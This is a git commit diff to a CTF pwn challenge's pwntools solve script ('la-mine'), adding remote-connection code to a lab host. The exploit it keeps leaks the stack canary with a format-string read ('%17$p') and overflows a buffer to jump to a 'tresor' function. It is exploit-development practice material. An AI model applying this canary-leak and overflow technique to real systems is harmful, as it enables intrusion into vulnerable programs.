c3387670d461c149a1d252c735340fea351a060a
repierre <pierre.boudvil1@gmail.com>
2023-11-12 15:24:19 +0100

    add la-mine

--- pwn/la-mine/solve/solve.py
+++ pwn/la-mine/solve/solve.py
@@ -1,26 +1,41 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template main
+# $ pwn template --host ctfd-tests --port 10006 main
 from pwn import *
 
-# Set up pwntools for the correct architecture
 context.terminal =  ["tmux", "splitw", "-h"]
-#context.log_level = 'debug'
+# Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or 'main')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
+host = args.HOST or 'ctfd-tests'
+port = int(args.PORT or 10006)
 
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
 
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
@@ -58,7 +73,7 @@ io.sendline(b'%17$p') # get canary
 canary = int(io.recvline().split(b'?')[1].split(b'...')[0], 16)
 log.success("Canary found %d, %s", canary, p64(canary))
 
-payload = b'a'* 10 + p64(canary) + b'\0' * 8 + p64(io.elf.sym['tresor'])
+payload = b'a'* 10 + p64(canary) + b'\0' * 8 + p64(exe.sym['tresor'])
 io.sendline(payload)
 io.interactive()
 
